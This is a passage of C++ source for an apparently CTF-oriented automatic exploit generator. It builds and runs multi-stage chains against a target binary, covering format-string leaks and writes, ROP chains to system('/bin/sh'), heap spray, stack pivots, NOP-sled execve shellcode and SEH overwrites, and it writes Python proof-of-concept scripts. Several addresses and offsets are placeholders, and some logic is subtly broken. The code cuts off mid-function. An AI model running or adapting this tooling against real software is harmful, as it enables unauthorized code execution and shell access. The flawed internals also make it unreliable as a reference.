        if (json_section.find("\"crashes\"") != std::string::npos) {
            result.found_crash = true;
            std::cout << "[+] Found potential crash paths via symbolic execution" << std::endl;
        }
    }
    
    std::string executeCommand(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (!pipe) return result;
        
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
        return result;
    }
};


// Multi-stage exploit chaining system
class ExploitChainBuilder {
private:
    std::string target_exe;
    ELFInfo& elf_info;
    ExploitContext& context;
    
public:
    ExploitChainBuilder(const std::string& exe, ELFInfo& elf, ExploitContext& ctx) 
        : target_exe(exe), elf_info(elf), context(ctx) {}
    
    std::vector<ExploitChain> buildExploitChains() {
        std::vector<ExploitChain> chains;
        
        // Chain 1: Information Leak -> ROP Chain
        if (elf_info.has_pie || elf_info.has_canary) {
            chains.push_back(buildInfoLeakROPChain());
        }
        
        // Chain 2: Format String -> Arbitrary Write -> Shell
        if (hasPrintfFunctions()) {
            chains.push_back(buildFormatStringChain());
        }
        
        // Chain 3: Heap Leak -> UAF -> Code Execution
        if (hasHeapFunctions()) {
            chains.push_back(buildHeapExploitChain());
        }
        
        // Chain 4: Buffer Overflow -> Stack Pivot -> ROP
        if (!elf_info.has_canary && elf_info.has_nx) {
            chains.push_back(buildStackPivotChain());
        }
        
        // Chain 5: Race Condition -> Privilege Escalation
        if (hasThreadingFunctions()) {
            chains.push_back(buildRaceConditionChain());
        }
        
        return chains;
    }
    
private:
    ExploitChain buildInfoLeakROPChain() {
        ExploitChain chain;
        chain.chain_id = "info_leak_rop";
        chain.attack_type = "Multi-stage ROP with ASLR bypass";
        chain.final_objective = "Code execution via ROP chain";
        
        // Stage 1: Leak addresses
        ExploitStage leak_stage;
        leak_stage.stage_name = "address_leak";
        leak_stage.payload = generateLeakPayload();
        leak_stage.success_indicators = {"0x7f", "0x40", "Stack:"};
        leak_stage.failure_indicators = {"Segmentation", "Aborted"};
        leak_stage.timeout_seconds = 5;
        
        // Stage 2: Calculate offsets
        ExploitStage calc_stage;
        calc_stage.stage_name = "offset_calculation";
        calc_stage.payload = ""; // Will be generated dynamically
        calc_stage.requires_interaction = true;
        
        // Stage 3: ROP chain execution
        ExploitStage rop_stage;
        rop_stage.stage_name = "rop_execution";
        rop_stage.success_indicators = {"$", "shell", "flag{", "success"};
        rop_stage.failure_indicators = {"Segmentation", "Illegal"};
        rop_stage.timeout_seconds = 15;
        
        chain.stages = {leak_stage, calc_stage, rop_stage};
        chain.success_probability = 0.7;
        
        return chain;
    }
    
    ExploitChain buildFormatStringChain() {
        ExploitChain chain;
        chain.chain_id = "format_string_chain";
        chain.attack_type = "Format string to arbitrary write";
        chain.final_objective = "Overwrite GOT/return address";
        
        // Stage 1: Find format string offset
        ExploitStage find_offset;
        find_offset.stage_name = "find_format_offset";
        find_offset.payload = "AAAA%p%p%p%p%p%p%p%p%p%p";
        find_offset.success_indicators = {"41414141"};
        
        // Stage 2: Leak addresses
        ExploitStage leak_addrs;
        leak_addrs.stage_name = "leak_addresses";
        leak_addrs.success_indicators = {"0x"};
        
        // Stage 3: Calculate write targets
        ExploitStage calc_targets;
        calc_targets.stage_name = "calculate_targets";
        calc_targets.requires_interaction = true;
        
        // Stage 4: Arbitrary write
        ExploitStage arb_write;
        arb_write.stage_name = "arbitrary_write";
        arb_write.success_indicators = {"success", "shell", "$"};
        arb_write.timeout_seconds = 10;
        
        chain.stages = {find_offset, leak_addrs, calc_targets, arb_write};
        chain.success_probability = 0.6;
        
        return chain;
    }
    
    ExploitChain buildHeapExploitChain() {
        ExploitChain chain;
        chain.chain_id = "heap_exploitation";
        chain.attack_type = "Heap corruption to code execution";
        
        ExploitStage heap_spray;
        heap_spray.stage_name = "heap_spray";
        heap_spray.payload = generateHeapSprayPayload();
        
        ExploitStage trigger_vuln;
        trigger_vuln.stage_name = "trigger_vulnerability";
        trigger_vuln.payload = generateHeapCorruptionPayload();
        
        ExploitStage exploit_corruption;
        exploit_corruption.stage_name = "exploit_corruption";
        exploit_corruption.success_indicators = {"shell", "$", "flag{"};
        
        chain.stages = {heap_spray, trigger_vuln, exploit_corruption};
        chain.success_probability = 0.4;
        
        return chain;
    }
    
    ExploitChain buildStackPivotChain() {
        ExploitChain chain;
        chain.chain_id = "stack_pivot_rop";
        chain.attack_type = "Stack pivot to controlled memory";
        
        ExploitStage pivot_setup;
        pivot_setup.stage_name = "setup_pivot_area";
        pivot_setup.payload = std::string(1000, 'A'); // Large buffer
        
        ExploitStage perform_pivot;
        perform_pivot.stage_name = "stack_pivot";
        perform_pivot.payload = generateStackPivotPayload();
        
        ExploitStage rop_execution;
        rop_execution.stage_name = "rop_chain";
        rop_execution.success_indicators = {"shell", "success"};
        
        chain.stages = {pivot_setup, perform_pivot, rop_execution};
        chain.success_probability = 0.5;
        
        return chain;
    }
    
    ExploitChain buildRaceConditionChain() {
        ExploitChain chain;
        chain.chain_id = "race_condition";
        chain.attack_type = "Race condition exploitation";
        
        ExploitStage setup_race;
        setup_race.stage_name = "setup_race_condition";
        setup_race.payload = "START_THREADS";
        
        ExploitStage trigger_race;
        trigger_race.stage_name = "trigger_race";
        trigger_race.payload = "RACE_TRIGGER";
        trigger_race.timeout_seconds = 1; // Fast timing
        
        ExploitStage exploit_race;
        exploit_race.stage_name = "exploit_race_window";
        exploit_race.success_indicators = {"race_won", "success"};
        
        chain.stages = {setup_race, trigger_race, exploit_race};
        chain.success_probability = 0.3;
        
        return chain;
    }
    
    // Helper payload generators
    std::string generateLeakPayload() {
        if (hasPrintfFunctions()) {
            return "%p.%p.%p.%p.%p.%p.%p.%p";
        } else {
            return std::string(200, 'A'); // Large buffer to leak stack
        }
    }
    
    std::string generateHeapSprayPayload() {
        std::string payload = "HEAP_SPRAY:";
        for (int i = 0; i < 100; i++) {
            payload += "AAAABBBBCCCCDDDD";
        }
        return payload;
    }
    
    std::string generateHeapCorruptionPayload() {
        return "FREE_CHUNK:" + std::string(64, 'X') + "CORRUPT_HEADER";
    }
    
    std::string generateStackPivotPayload() {
        std::string payload = std::string(72, 'A'); // Padding
        // Add pivot gadget (leave rsp, ret or similar)
        payload += packAddress(0x400000); // Placeholder address
        return payload;
    }
    
    std::string packAddress(uint64_t addr) {
        std::string packed;
        for (int i = 0; i < 8; i++) {
            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
        }
        return packed;
    }
    
    bool hasPrintfFunctions() {
        std::vector<std::string> printf_funcs = {"printf", "sprintf", "fprintf"};
        for (const auto& func : printf_funcs) {
            if (std::find(elf_info.imported_functions.begin(), 
                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
                return true;
            }
        }
        return false;
    }
    
    bool hasHeapFunctions() {
        std::vector<std::string> heap_funcs = {"malloc", "free", "calloc", "realloc"};
        for (const auto& func : heap_funcs) {
            if (std::find(elf_info.imported_functions.begin(), 
                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
                return true;
            }
        }
        return false;
    }
    
    bool hasThreadingFunctions() {
        std::vector<std::string> thread_funcs = {"pthread_create", "pthread_mutex"};
        for (const auto& func : thread_funcs) {
            if (std::find(elf_info.imported_functions.begin(), 
                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
                return true;
            }
        }
        return false;
    }
};

// Add these methods to AdvancedCTFSolver class:

void performMultiStageExploitation() {
    if (!multi_stage_mode) return;
    
    std::cout << "[*] ===== MULTI-STAGE EXPLOIT CHAINING =====" << std::endl;
    
    ExploitChainBuilder builder(target_exe, elf_info, exploit_context);
    exploit_chains = builder.buildExploitChains();
    
    std::cout << "[+] Built " << exploit_chains.size() << " exploit chains" << std::endl;
    
    for (auto& chain : exploit_chains) {
        std::cout << "\n[*] Testing chain: " << chain.chain_id 
                  << " (" << chain.attack_type << ")" << std::endl;
        std::cout << "[*] Success probability: " << chain.success_probability << std::endl;
        
        ChainResult result = executeExploitChain(chain);
        
        if (result.successful) {
            std::cout << "[!] SUCCESS! Chain completed successfully!" << std::endl;
            std::cout << "[+] Stages completed: " << result.stages_completed << std::endl;
            
            if (!result.final_flag.empty()) {
                std::cout << "[!] FLAG CAPTURED: " << result.final_flag << std::endl;
                saveSolution(chain.stages.back().payload, result.final_flag);
            }
            
            if (!result.shell_access.empty()) {
                std::cout << "[!] SHELL ACCESS GAINED!" << std::endl;
            }
            
            saveChainResult(result);
            generateChainPoC(chain, result);
            
            // If we got the flag or shell, we're done
            if (!result.final_flag.empty() || !result.shell_access.empty()) {
                return;
            }
        } else {
            std::cout << "[!] Chain failed: " << chain.failure_reason << std::endl;
            std::cout << "[*] Completed stages: " << result.stages_completed 
                      << "/" << chain.stages.size() << std::endl;
        }
    }
}

ChainResult executeExploitChain(ExploitChain& chain) {
    ChainResult result;
    result.chain_id = chain.chain_id;
    result.successful = false;
    result.stages_completed = 0;
    
    std::cout << "[*] Executing " << chain.stages.size() << " stage chain..." << std::endl;
    
    for (size_t i = 0; i < chain.stages.size(); i++) {
        auto& stage = chain.stages[i];
        std::cout << "[*] Stage " << (i+1) << ": " << stage.stage_name << std::endl;
        
        StageResult stage_result = executeStage(stage, leaked_data);
        result.stage_outputs.push_back(stage_result.output);
        
        if (!stage_result.successful) {
            chain.failure_reason = "Stage " + std::to_string(i+1) + " failed: " + stage_result.error;
            std::cout << "[!] " << chain.failure_reason << std::endl;
            return result;
        }
        
        result.stages_completed++;
        
        // Extract data from this stage for next stages
        extractStageData(stage_result, leaked_data);
        
        // Update subsequent stage payloads based on leaked data
        updateSubsequentStages(chain, i, leaked_data);
        
        // Check for early success indicators
        if (checkEarlySuccess(stage_result.output)) {
            result.final_flag = extractFlag(stage_result.output);
            result.shell_access = extractShellAccess(stage_result.output);
            result.successful = true;
            return result;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
    // All stages completed successfully
    result.successful = true;
    result.final_flag = extractFlag(result.stage_outputs.back());
    result.shell_access = extractShellAccess(result.stage_outputs.back());
    
    return result;
}

struct StageResult {
    bool successful = false;
    std::string output;
    std::string error;
    std::map<std::string, std::string> extracted_data;
    int exit_code = 0;
    int signal_num = 0;
};

StageResult executeStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data) {
    StageResult result;
    
    // Handle interactive stages (offset calculation, etc.)
    if (stage.requires_interaction) {
        return handleInteractiveStage(stage, context_data);
    }
    
    // Execute normal stage
    std::string final_payload = stage.payload;
    
    // Substitute context data into payload
    for (const auto& data : context_data) {
        std::string placeholder = "{" + data.first + "}";
        size_t pos = final_payload.find(placeholder);
        if (pos != std::string::npos) {
            final_payload.replace(pos, placeholder.length(), data.second);
        }
    }
    
    std::cout << "[*] Executing stage with payload size: " << final_payload.size() << std::endl;
    
    // Execute with timeout
    std::string output = executeWithTimeout(final_payload, stage.timeout_seconds);
    result.output = output;
    
    // Check success indicators
    for (const auto& indicator : stage.success_indicators) {
        if (output.find(indicator) != std::string::npos) {
            result.successful = true;
            break;
        }
    }
    
    // Check failure indicators
    for (const auto& indicator : stage.failure_indicators) {
        if (output.find(indicator) != std::string::npos) {
            result.successful = false;
            result.error = "Found failure indicator: " + indicator;
            return result;
        }
    }
    
    // If no explicit indicators, assume success if no crash
    if (stage.success_indicators.empty() && stage.failure_indicators.empty()) {
        result.successful = true;
    }
    
    return result;
}

StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data) {
    StageResult result;
    result.successful = true;
    
    if (stage.stage_name == "offset_calculation") {
        // Calculate ROP chain offsets based on leaked addresses
        if (context_data.count("leaked_stack") && context_data.count("leaked_libc")) {
            uint64_t stack_addr = std::stoull(context_data.at("leaked_stack"), nullptr, 16);
            uint64_t libc_addr = std::stoull(context_data.at("leaked_libc"), nullptr, 16);
            
            // Calculate system() address
            uint64_t system_addr = libc_addr + 0x45390; // Typical offset
            result.extracted_data["system_addr"] = "0x" + std::to_string(system_addr);
            
            std::cout << "[+] Calculated system() at: 0x" << std::hex << system_addr << std::dec << std::endl;
        }
    } else if (stage.stage_name == "calculate_targets") {
        // Calculate format string write targets
        if (context_data.count("format_offset")) {
            int offset = std::stoi(context_data.at("format_offset"));
            result.extracted_data["write_offset"] = std::to_string(offset + 4);
            std::cout << "[+] Calculated write offset: " << (offset + 4) << std::endl;
        }
    }
    
    return result;
}

void extractStageData(const StageResult& stage_result, std::map<std::string, std::string>& leaked_data) {
    // Extract addresses from output
    std::regex addr_regex(R"(0x[0-9a-fA-F]+)");
    std::sregex_iterator iter(stage_result.output.begin(), stage_result.output.end(), addr_regex);
    std::sregex_iterator end;
    
    int addr_count = 0;
    for (; iter != end; ++iter) {
        std::string addr = iter->str();
        leaked_data["addr_" + std::to_string(addr_count)] = addr;
        
        // Classify address types
        uint64_t addr_val = std::stoull(addr, nullptr, 16);
        if (addr_val >= 0x7f0000000000) {
            leaked_data["leaked_libc"] = addr;
        } else if (addr_val >= 0x7fff00000000) {
            leaked_data["leaked_stack"] = addr;
        } else if (addr_val >= 0x400000) {
            leaked_data["leaked_binary"] = addr;
        }
        
        addr_count++;
    }
    
    // Extract format string offset
    if (stage_result.output.find("41414141") != std::string::npos) {
        // Found AAAA pattern, calculate offset
        leaked_data["format_offset"] = "6"; // Common offset
    }
    
    // Merge extracted data from stage
    for (const auto& data : stage_result.extracted_data) {
        leaked_data[data.first] = data.second;
    }
}

void updateSubsequentStages(ExploitChain& chain, size_t current_stage, const std::map<std::string, std::string>& leaked_data) {
    for (size_t i = current_stage + 1; i < chain.stages.size(); i++) {
        auto& stage = chain.stages[i];
        
        if (stage.stage_name == "rop_execution" && leaked_data.count("system_addr")) {
            // Update ROP chain with real addresses
            stage.payload = buildROPChain(leaked_data);
        } else if (stage.stage_name == "arbitrary_write" && leaked_data.count("write_offset")) {
            // Update format string payload
            int offset = std::stoi(leaked_data.at("write_offset"));
            stage.payload = buildFormatStringWrite(offset);
        }
    }
}

std::string buildROPChain(const std::map<std::string, std::string>& leaked_data) {
    std::string rop_chain = std::string(72, 'A'); // Padding
    
    if (leaked_data.count("system_addr")) {
        uint64_t system_addr = std::stoull(leaked_data.at("system_addr"), nullptr, 16);
        
        // Add pop rdi; ret gadget
        rop_chain += packAddress(0x400123); // Example gadget address
        // Add /bin/sh string address
        rop_chain += packAddress(0x400200); // Example string address
        // Add system address
        rop_chain += packAddress(system_addr);
    }
    
    return rop_chain;
}

std::string buildFormatStringWrite(int offset) {
    return "%" + std::to_string(offset) + "$n";
}

bool checkEarlySuccess(const std::string& output) {
    std::vector<std::string> success_patterns = {
        "flag{", "FLAG{", "CTF{", "$", "shell", "success", "pwned"
    };
    
    for (const auto& pattern : success_patterns) {
        if (output.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

std::string extractFlag(const std::string& output) {
    std::regex flag_regex(R"((flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}))");
    std::smatch match;
    
    if (std::regex_search(output, match, flag_regex)) {
        return match[1].str();
    }
    
    return "";
}

std::string extractShellAccess(const std::string& output) {
    if (output.find("$") != std::string::npos || 
        output.find("shell") != std::string::npos ||
        output.find("bash") != std::string::npos) {
        return "shell_access_detected";
    }
    
    return "";
}

std::string executeWithTimeout(const std::string& payload, int timeout_seconds) {
    // Similar to captureOutput but with configurable timeout
    int pipefd[2];
    if (pipe(pipefd) == -1) return "";
    
    int stdout_pipe[2];
    if (pipe(stdout_pipe) == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return "";
    }
    
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        close(pipefd[1]);
        close(stdout_pipe[0]);
        
        dup2(pipefd[0], STDIN_FILENO);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stdout_pipe[1], STDERR_FILENO);
        
        close(pipefd[0]);
        close(stdout_pipe[1]);
        
        alarm(timeout_seconds);
        
        execl(target_exe.c_str(), target_exe.c_str(), nullptr);
        _exit(1);
    } else if (pid > 0) {
        // Parent process - similar to captureOutput but with custom timeout
        close(pipefd[0]);
        close(stdout_pipe[1]);
        
        if (!payload.empty()) {
            write(pipefd[1], payload.c_str(), payload.size());
        }
        close(pipefd[1]);
        
        std::string output;
        char buffer[1024];
        
        fd_set readfds;
        struct timeval timeout;
        timeout.tv_sec = timeout_seconds;
        timeout.tv_usec = 0;
        
        FD_ZERO(&readfds);
        FD_SET(stdout_pipe[0], &readfds);
        
        while (select(stdout_pipe[0] + 1, &readfds, nullptr, nullptr, &timeout) > 0) {
            ssize_t bytes_read = read(stdout_pipe[0], buffer, sizeof(buffer) - 1);
            if (bytes_read <= 0) break;
            
            buffer[bytes_read] = '\0';
            output += buffer;
            
            // Reset timeout
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(stdout_pipe[0], &readfds);
        }
        
        close(stdout_pipe[0]);
        
        int status;
        waitpid(pid, &status, WNOHANG);
        
        return output;
    }
    
    return "";
}

void saveChainResult(const ChainResult& result) {
    std::string filename = "chain_result_" + result.chain_id + ".txt";
    std::ofstream file(filename);
    
    file << "=== EXPLOIT CHAIN RESULT ===" << std::endl;
    file << "Chain ID: " << result.chain_id << std::endl;
    file << "Successful: " << (result.successful ? "YES" : "NO") << std::endl;
    file << "Stages Completed: " << result.stages_completed << std::endl;
    
    if (!result.final_flag.empty()) {
        file << "FLAG: " << result.final_flag << std::endl;
    }
    
    if (!result.shell_access.empty()) {
        file << "Shell Access: " << result.shell_access << std::endl;
    }
    
    file << "\n=== STAGE OUTPUTS ===" << std::endl;
    for (size_t i = 0; i < result.stage_outputs.size(); i++) {
        file << "Stage " << (i+1) << ":" << std::endl;
        file << result.stage_outputs[i] << std::endl;
        file << "---" << std::endl;
    }
    
    file.close();
    std::cout << "[+] Chain result saved: " << filename << std::endl;
}

void generateChainPoC(const ExploitChain& chain, const ChainResult& result) {
    std::string poc_filename = "chain_poc_" + chain.chain_id + ".py";
    std::ofstream poc(poc_filename);
    
    poc << "#!/usr/bin/env python3" << std::endl;
    poc << "# Multi-stage exploit chain PoC" << std::endl;
    poc << "# Chain: " << chain.attack_type << std::endl;
    poc << "import subprocess" << std::endl;
    poc << "import time" << std::endl;
    poc << std::endl;
    
    poc << "def exploit_chain():" << std::endl;
    poc << "    target = '" << target_exe << "'" << std::endl;
    poc << "    print('[*] Starting multi-stage exploit chain')" << std::endl;
    poc << std::endl;
    
    for (size_t i = 0; i < chain.stages.size(); i++) {
        const auto& stage = chain.stages[i];
        poc << "    # Stage " << (i+1) << ": " << stage.stage_name << std::endl;
        poc << "    print('[*] Stage " << (i+1) << ": " << stage.stage_name << "')" << std::endl;
        poc << "    payload_" << i << " = b'";
        
        for (unsigned char c : stage.payload) {
            poc << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)c;
        }
        
        poc << "'" << std::endl;
        poc << "    proc_" << i << " = subprocess.run([target], input=payload_" << i 
            << ", capture_output=True, timeout=" << stage.timeout_seconds << ")" << std::endl;
        poc << "    print(f'[+] Stage " << (i+1) << " output: {proc_" << i << ".stdout.decode()[:100]}')" << std::endl;
        poc << "    time.sleep(0.5)" << std::endl;
        poc << std::endl;
    }
    
    poc << "    print('[*] Chain execution complete')" << std::endl;
    poc << std::endl;
    poc << "if __name__ == '__main__':" << std::endl;
    poc << "    exploit_chain()" << std::endl;
    
    poc.close();
    chmod(poc_filename.c_str(), 0755);
    std::cout << "[+] Chain PoC generated: " << poc_filename << std::endl;
}

std::string packAddress(uint64_t addr) {
    std::string packed;
    for (int i = 0; i < 8; i++) {
        packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
    }
    return packed;
}


class AdaptiveExploitGenerator {
private:
    ExploitContext context;
    std::string target_binary;
    
public:
    AdaptiveExploitGenerator(const ExploitContext& ctx, const std::string& binary) 
        : context(ctx), target_binary(binary) {}
    
    // Generate exploit based on analysis
    std::vector<std::string> generateAdaptiveExploits() {
        std::vector<std::string> exploits;
        
        if (context.exploit_strategy == "info_leak_rop_chain") {
            exploits = generateInfoLeakROPExploit();
        } else if (context.exploit_strategy == "rop_chain") {
            exploits = generateROPChainExploit();
        } else if (context.exploit_strategy == "shellcode_injection") {
            exploits = generateShellcodeExploit();
        } else if (context.exploit_strategy == "seh_overwrite") {
            exploits = generateSEHExploit();
        } else if (context.exploit_strategy == "heap_exploitation") {
            exploits = generateHeapExploit();
        } else {
            exploits = generateClassicOverflowExploit();
        }
        
        return exploits;
    }
    
private:
    std::vector<std::string> generateInfoLeakROPExploit() {
        std::vector<std::string> exploits;
        
        // Stage 1: Information leak
        std::string leak_payload = generateInfoLeakPayload();
        exploits.push_back(leak_payload);
        
        // Stage 2: ROP chain (will be generated after leak)
        std::string rop_payload = generateROPPayload();
        exploits.push_back(rop_payload);
        
        return exploits;
    }
    
    std::string generateInfoLeakPayload() {
        // Generate payload to leak addresses
        std::string payload;
        
        if (hasFunction("printf")) {
            // Format string leak
            payload = "%p.%p.%p.%p.%p.%p.%p.%p";
        } else if (hasFunction("puts")) {
            // Buffer overflow to leak stack
            payload = std::string(100, 'A');
        }
        
        return payload;
    }
    
    std::string generateROPPayload() {
        std::string payload;
        
        // Build ROP chain
        if (hasFunction("system") && !context.gadget_addresses.empty()) {
            // system("/bin/sh") ROP chain
            payload += std::string(72, 'A');  // Padding
            
            // pop rdi; ret gadget + "/bin/sh" address
            if (context.gadget_addresses.size() > 0) {
                uint64_t pop_rdi = context.gadget_addresses[0];  // Assume first is pop rdi
                payload += packAddress(pop_rdi);
                payload += packAddress(findStringAddress("/bin/sh"));
                payload += packAddress(context.symbol_table["system"]);
            }
        }
        
        return payload;
    }
    
    std::vector<std::string> generateROPChainExploit() {
        std::vector<std::string> exploits;
        
        // Generate various ROP chain attempts
        for (size_t i = 64; i <= 256; i += 8) {
            std::string payload = std::string(i, 'A');
            
            if (!context.gadget_addresses.empty() && hasFunction("system")) {
                // Add ROP chain
                payload += packAddress(context.gadget_addresses[0]);  // pop rdi
                payload += packAddress(findStringAddress("/bin/sh"));
                payload += packAddress(context.symbol_table["system"]);
            }
            
            exploits.push_back(payload);
        }
        
        return exploits;
    }
    
    std::vector<std::string> generateShellcodeExploit() {
        std::vector<std::string> exploits;
        
        // x86_64 execve("/bin/sh") shellcode
        std::string shellcode = 
            "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
            "\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
        
        // NOP sled + shellcode combinations
        for (int nop_size : {50, 100, 200, 500}) {
            std::string payload = std::string(nop_size, '\x90') + shellcode;
            
            // Add different padding sizes
            for (size_t pad : {64, 72, 80, 88, 96}) {
                std::string full_payload = std::string(pad, 'A') + payload;
                exploits.push_back(full_payload);
            }
        }
        
        return exploits;
    }
    
    std::vector<std::string> generateSEHExploit() {
        std::vector<std::string> exploits;
        
        // SEH overwrite pattern
        for (size_t offset : {80, 100, 120, 140}) {
            std::string payload = std::string(offset, 'A');
            payload += "BBBB";  // nSEH
            payload += "CCCC";  // SEH handler
            exploits.push_back(payload);
        }
        
        return exploits;
    }
    
    std::vector<std::string> generateHeapExploit() {
        std::vector<std::string> exploits;
        
        // Use-after-free patterns  
        exploits.push_back("malloc_large_chunk");
        exploits.push_back("free_double");
        exploits.push_back("heap_overflow");
        
        return exploits;
    }
    
    std::vector<std::string> generateClassicOverflowExploit() {
        std::vector<std::string> exploits;
        
        // Classic buffer overflow patterns
        for (size_t size : {64, 72, 80, 88, 96, 104, 112, 120, 128}) {
            std::string payload = std::string(size, 'A');
            payload += "BBBB";  // Return address
            exploits.push_back(payload);
        }
        
        return exploits;
    }
    
    std::string packAddress(uint64_t addr) {
        std::string packed;
        for (int i = 0; i < 8; i++) {
            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
        }
        return packed;
    }
    
    uint64_t findStringAddress(const std::string& str) {
        // Try to find string in binary
        if (str == "/bin/sh" && context.symbol_table.count("str_bin_sh")) {
            return context.symbol_table["str_bin_sh"];
        }
        return 0x7ffff7b84d57;  // Common libc /bin/sh address (needs proper leak)
    }
    
    bool hasFunction(const std::string& func) {
        return context.symbol_table.count(func) > 0;
    }
};

// Add these missing helper functions to your AdvancedCTFSolver class:

// Helper function to get binary analysis as string
std::string getBinaryAnalysisString() {
    std::stringstream ss;
    
    ss << "Architecture: " << elf_info.architecture << "\n";
    ss << "Entry point: 0x" << std::hex << elf_info.entry_point << std::dec << "\n";
    ss << "Has canary: " << (elf_info.has_canary ? "true" : "false") << "\n";
    ss << "Has NX: " << (elf_info.has_nx ? "true" : "false") << "\n";
    ss << "Has PIE: " << (elf_info.has_pie ? "true" : "false") << "\n";
    ss << "Has RELRO: " << (elf_info.has_relro ? "true" : "false") << "\n";
    ss << "Has FORTIFY: " << (elf_info.has_fortify ? "true" : "false") << "\n";
    
    ss << "Dangerous functions: ";
    for (const auto& func : elf_info.dangerous_functions) {
        ss << func << " ";
    }
    ss << "\n";
    
    ss << "Imported functions: ";
    for (const auto& func : elf_info.imported_functions) {
        ss << func << " ";
    }
    ss << "\n";
    
    return ss.str();
}

// Helper function to get runtime behavior as string
std::string getRuntimeBehaviorString() {
    std::stringstream ss;
    
    // Run the program with various inputs to observe behavior
    std::vector<std::string> test_inputs = {"", "A", "AAAA", "%p%p%p", "1234", "\x01\x02\x03\x04"};
    
    for (const auto& input : test_inputs) {
        std::string output = captureOutput(input);
        ss << "Input: '" << input << "' -> Output: '" << output << "'\n";
        
        // Add a small delay to avoid overwhelming the target
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    return ss.str();
}

// Helper function to get GDB analysis as string  
std::string getGDBAnalysisString() {
    std::stringstream ss;
    
    if (gdb_analyzer) {
        ss << "Exploit strategy: " << exploit_context.exploit_strategy << "\n";
        ss << "Has ASLR: " << (exploit_context.has_aslr ? "true" : "false") << "\n";
        ss << "Has DEP: " << (exploit_context.has_dep ? "true" : "false") << "\n";
        ss << "Has SEH: " << (exploit_context.has_seh ? "true" : "false") << "\n";
        ss << "ROP gadgets found: " << exploit_context.gadget_addresses.size() << "\n";
        ss << "Exploitable functions: ";
        for (const auto& func : exploit_context.exploitable_functions) {
            ss << func << " ";
        }
        ss << "\n";
        
        // Add symbol information
        ss << "Symbol table size: " << exploit_context.symbol_table.size() << "\n";
        for (const auto& symbol : exploit_context.symbol_table) {
            ss << symbol.first << ": 0x" << std::hex << symbol.second << std::dec << " ";
        }
        ss << "\n";
    }
    
    return ss.str();
}

// Test adaptive exploits function
void testAdaptiveExploits(const std::vector<std::string>& exploits) {
    std::cout << "[*] Testing " << exploits.size() << " adaptive exploits..." << std::endl;
    
    int successful_exploits = 0;
    int crashes_found = 0;
    
    for (size_t i = 0; i < exploits.size(); i++) {
        if (verbose_mode && i % 10 == 0) {
            std::cout << "[*] Testing exploit " << i + 1 << "/" << exploits.size() << std::endl;
        }
        
        VulnResult result;
        result.input = exploits[i];
        result.payload_size = exploits[i].size();
        
        // Test the exploit
        bool crashed = testSingleExploit(exploits[i], result);
        
        if (crashed) {
            crashes_found++;
            vulnerabilities.push_back(result);
            
            std::cout << "[!] Crash found with adaptive exploit #" << i + 1 << std::endl;
            std::cout << "    Signal: " << result.signal_num << std::endl;
            std::cout << "    Type: " << result.vuln_type << std::endl;
            
            // Save detailed results
            saveAdvancedVulnerability(result, i);
            
            if (result.exploitable) {
                successful_exploits++;
                generateAdvancedPoC(result, i);
                std::cout << "[+] Exploitable vulnerability confirmed!" << std::endl;
            }
        }
        
        // Check for successful exploitation (non-crash success)
        std::string output = captureOutput(exploits[i]);
        if (isSuccessfulExploit(output)) {
            successful_exploits++;
            std::cout << "[!] SUCCESS! Adaptive exploit worked!" << std::endl;
            std::cout << "[+] Output: " << output << std::endl;
            
            // Save successful solution
            saveSolution(exploits[i], output);
            generateSolutionScript(exploits[i]);
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    
    std::cout << "[*] Adaptive exploit testing complete:" << std::endl;
    std::cout << "    Total exploits tested: " << exploits.size() << std::endl;
    std::cout << "    Crashes found: " << crashes_found << std::endl;
    std::cout << "    Successful exploits: " << successful_exploits << std::endl;
}

// Test a single exploit
bool testSingleExploit(const std::string& exploit, VulnResult& result) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return false;
    
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        close(pipefd[1]);
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);
        
        // Set resource limits
        struct rlimit rl;
        rl.rlim_cur = rl.rlim_max = 10;  // 10 second timeout
        setrlimit(RLIMIT_CPU, &rl);
        
        rl.rlim_cur = rl.rlim_max = 100 * 1024 * 1024;  // 100MB memory limit
        setrlimit(RLIMIT_AS, &rl);
        
        execl(target_exe.c_str(), target_exe.c_str(), nullptr);
        _exit(1);
    } else if (pid > 0) {
        // Parent process
        close(pipefd[0]);
        
        // Write exploit to child
        write(pipefd[1], exploit.c_str(), exploit.size());
        close(pipefd[1]);
        
        int status;
        int wait_result = waitpid(pid, &status, 0);
        
        if (wait_result == pid) {
            if (WIFEXITED(status)) {
                result.exit_code = WEXITSTATUS(status);
                return false; // Normal exit
            } else if (WIFSIGNALED(status)) {
                result.signal_num = WTERMSIG(status);
                
                // Classify crash type
                switch (result.signal_num) {
                    case SIGSEGV:
                        result.vuln_type = "Segmentation Fault";
                        result.description = "Memory access violation";
                        result.exploitable = true;
                        result.severity = "HIGH";
                        break;
                    case SIGABRT:
                        result.vuln_type = "Abort Signal";
                        result.description = "Program aborted (stack smashing detected?)";
                        result.severity = "MEDIUM";
                        break;
                    case SIGILL:
                        result.vuln_type = "Illegal Instruction";
                        result.description = "Invalid instruction (code corruption)";
